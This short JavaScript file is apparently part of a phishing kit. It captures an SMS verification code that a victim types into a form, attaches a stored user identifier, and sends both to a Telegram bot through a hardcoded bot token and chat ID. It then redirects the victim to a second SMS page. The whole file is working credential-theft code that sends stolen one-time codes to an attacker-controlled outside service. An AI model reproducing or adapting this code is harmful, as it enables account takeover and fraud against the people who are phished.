
var sms = document.getElementById('sms');
var usercode = localStorage.getItem('usercode') ;

document.getElementById('form5').addEventListener('submit', function(e){
    e.preventDefault();
    const bot = new Bot("6135693705:AAEYjbPzeLclg5QVZbLDaxevBy86Xjwf1G4", 2068186644);

    try {

    bot.sendMessage('👔User : ' + usercode + '💌sms1 : ' + sms.value)
    .then(res => {
        console.log(res);
        window.location.href = './sms2.html';
    })
}
catch(err) {
    console.log(err)
}
   
})
